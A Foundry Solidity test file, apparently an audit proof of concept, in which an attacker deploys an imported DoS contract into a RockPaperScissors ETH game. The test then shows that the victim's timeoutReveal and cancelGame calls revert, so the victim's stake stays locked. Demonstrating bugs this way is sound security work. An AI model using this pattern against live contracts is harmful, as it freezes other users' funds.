// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "../src/WinningToken.sol";
import "../src/RockPaperScissors.sol";
import "../src/DoS.sol";
import "forge-std/Test.sol";

contract JoiningWrongGameTypeTest is Test {
    WinningToken token;
    RockPaperScissors game;

    address playerA = makeAddr("playerA");
    address attacker = makeAddr("attacker");
    address admin = makeAddr("admin");

    function setUp() public {
        game = new RockPaperScissors();

        vm.deal(playerA, 10 ether);
        vm.deal(attacker, 10 ether);
        require(playerA.balance == attacker.balance, "Setup failed");
    }

    function test_dos_cancelGame() public {
        vm.prank(playerA);
        uint256 gameId = game.createGameWithEth{value: 1 ether}(1, 5 minutes);

        vm.startPrank(attacker);
        DoS exploit = new DoS{value: 1 ether}(game, gameId);
        exploit.setDenied(true);
        vm.stopPrank();

        vm.warp(block.timestamp + 6 minutes);
        vm.startPrank(playerA);
        vm.expectRevert();
        game.timeoutReveal(gameId);

        vm.expectRevert();
        game.cancelGame(gameId);
        vm.stopPrank();
    }

    function test_dos_finishGame() public {
        vm.prank(playerA);
        uint256 gameId = game.createGameWithEth{value: 1 ether}(1, 5 minutes);

        vm.startPrank(attacker);
        DoS exploit = new DoS{value: 1 ether}(game, gameId);
        exploit.setDenied(true);
        vm.stopPrank();

        vm.prank(playerA);
        uint8 move = 1;
        bytes32 salt = keccak256(abi.encodePacked(block.timestamp, playerA));
        game.commitMove(gameId, keccak256(abi.encodePacked(move, salt)));

        vm.warp(block.timestamp + 6 minutes);
        vm.prank(playerA);
        vm.expectRevert();
        game.timeoutReveal(gameId);
    }
}
